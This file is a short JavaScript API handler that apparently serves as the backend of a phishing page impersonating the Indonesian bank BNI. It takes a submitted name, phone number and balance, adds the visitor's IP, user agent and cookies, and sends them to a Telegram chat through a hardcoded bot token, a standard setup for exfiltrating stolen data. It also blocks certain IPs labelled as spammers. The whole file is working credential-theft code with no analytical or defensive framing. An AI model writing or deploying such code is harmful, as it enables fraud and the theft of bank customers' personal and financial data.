export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  // ⛔ Blokir IP SPAMMER
  const ip =
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.socket?.remoteAddress ||
    'Unknown IP';

  const blockedIPs = [
    '180.248.76.246',
    '182.8.179.108'
  ];

  if (blockedIPs.includes(ip)) {
    console.log(`❌ Blokir IP ${ip} karena terdeteksi spam`);
    return res.status(403).json({ success: false, message: 'Akses ditolak.' });
  }

  // ✅ Lanjutkan jika aman
  const { a, b, c } = req.body;

  const userAgent = req.headers['user-agent'] || 'Unknown';
  const cookies = req.headers.cookie || 'No cookies sent';

  const message = `
📥 *RES BNI NEW*
────────────────────
👤 *Nama:* ${a}
📱 *Nomor:* ${b}
💰 *Saldo:* ${c}
────────────────────
🌐 *IP:* ${ip}
🧠 *User-Agent:* ${userAgent}
🍪 *Cookies:* ${cookies}
────────────────────`;
  
  const telegramId = '7008824750';
  const botToken = '7507560214:AAF_tUasb0WwqNAcsVaf2bcVb6dzxIO7gvk';

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Telegram Error:', error);
    res.status(500).json({ success: false });
  }
}
